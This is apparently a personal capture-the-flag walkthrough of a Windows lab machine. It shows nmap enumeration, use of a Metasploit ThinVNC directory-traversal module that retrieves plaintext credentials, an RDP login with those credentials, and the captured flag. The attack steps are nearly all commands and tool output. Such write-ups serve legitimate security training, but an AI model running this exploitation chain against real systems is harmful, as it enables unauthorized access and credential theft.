└─# nmap -sV -Pn -p- -A --min-rate 5000  10.150.150.69
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn?
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-09-12T16:37:33+00:00; +34m55s from scanner time.
| ssl-cert: Subject: commonName=ElMariachi-PC
| Not valid before: 2023-09-11T13:09:13
|_Not valid after:  2024-03-12T13:09:13
| rdp-ntlm-info: 
|   Target_Name: ELMARIACHI-PC
|   NetBIOS_Domain_Name: ELMARIACHI-PC
|   NetBIOS_Computer_Name: ELMARIACHI-PC
|   DNS_Domain_Name: ElMariachi-PC
|   DNS_Computer_Name: ElMariachi-PC
|   Product_Version: 10.0.17763
|_  System_Time: 2023-09-12T16:37:07+00:00
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
50417/tcp open  msrpc         Microsoft Windows RPC
60000/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Type: text/html
|     Content-Length: 177
|     Connection: Keep-Alive
|     <HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>404 Not Found</H1>The requested URL nice%20ports%2C/Tri%6Eity.txt%2ebak was not found on this server.<P></BODY></HTML>
|   GetRequest: 
|     HTTP/1.1 401 Access Denied
|     Content-Type: text/html
|     Content-Length: 144
|     Connection: Keep-Alive
|     WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="/aCkxKwP5kAI7EcCrA/mQA==", opaque="n6CJDKcTjoQGYsVjU2D2GcLWDGfrGf66oZ"
|_    <HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL requires 
Running (JUST GUESSING): Microsoft Windows 10|2008|7|Vista|Longhorn|8.1 (95%), Microsoft embedded (92%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows cpe:/h:microsoft:xbox_one cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (95%), Microsoft Windows 10 1511 (95%), Microsoft Windows 10 1703 (95%), Microsoft Windows Server 2008 R2 (95%), Microsoft Windows Server 2008 SP2 (95%), Microsoft Windows 7 Enterprise SP1 (95%), Microsoft Windows 7 SP1 (95%), Microsoft Windows 8.1 Update 1 (95%), Microsoft Windows 8 (95%), Microsoft Windows Vista SP1 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 34m54s, deviation: 0s, median: 34m54s
| smb2-time: 
|   date: 2023-09-12T16:37:07
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   444.97 ms 10.66.66.1
2   448.24 ms 10.150.150.69

i tried ┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/Pwntilldawn]
└─# smbclient -L 10.150.150.69
Password for [WORKGROUP\kali]:
session setup failed: NT_STATUS_ACCESS_DENIED

then i tried this also: ─# nmap --script "safe or smb-enum-*" -p 445 10.150.150.69
but nothing

Ok when i try also:
┌──(root㉿kali)-[/home/kali/CTFs/Boot2root/Pwntilldawn]
└─# nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 10.150.150.69
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-12 12:21 EDT
Nmap scan report for 10.150.150.69
Host is up (1.0s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
| rdp-ntlm-info: 
|   Target_Name: ELMARIACHI-PC
|   NetBIOS_Domain_Name: ELMARIACHI-PC
|   NetBIOS_Computer_Name: ELMARIACHI-PC
|   DNS_Domain_Name: ElMariachi-PC
|   DNS_Computer_Name: ElMariachi-PC
|   Product_Version: 10.0.17763
|_  System_Time: 2023-09-12T16:56:24+00:00
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|     RDSTLS: SUCCESS
|     SSL: SUCCESS
|_  RDP Protocol Version:  RDP 10.6 server

Nmap done: 1 IP address (1 host up) scanned in 16.28 seconds

Then found nothing i go ahead and read the open port and found on port 60000 that WWW-Authenticate:
60000/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Type: text/html
|     Content-Length: 177
|     Connection: Keep-Alive
|     <HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>404 Not Found</H1>The requested URL nice%20ports%2C/Tri%6Eity.txt%2ebak was not found on this server.<P></BODY></HTML>
|   GetRequest: 
|     HTTP/1.1 401 Access Denied
|     Content-Type: text/html
|     Content-Length: 144
|     Connection: Keep-Alive
|     WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="/aCkxKwP5kAI7EcCrA/mQA==", opaque="n6CJDKcTjoQGYsVjU2D2GcLWDGfrGf66oZ"

and it's ThinVNC, now i openup my msfconsole and search for exploit msf6 > search ThinVNC

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/thinvnc_traversal  2019-10-16       normal  No     ThinVNC Directory Traversal
msf6 auxiliary(scanner/http/thinvnc_traversal) > set rport 60000
rport => 60000
msf6 auxiliary(scanner/http/thinvnc_traversal) > exploit

[+] File ThinVnc.ini saved in: /root/.msf4/loot/20230912123534_default_10.150.150.69_thinvnc.traversa_604299.txt
[+] Found credentials: desperado:TooComplicatedToGuessMeAhahahahahahahh
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

Then i opened it:
└─# xfreerdp /u:desperado /p:TooComplicatedToGuessMeAhahahahahahahh /v:10.150.150.69      

flag= 2971f3459fe55db1237aad5e0f0a259a41633962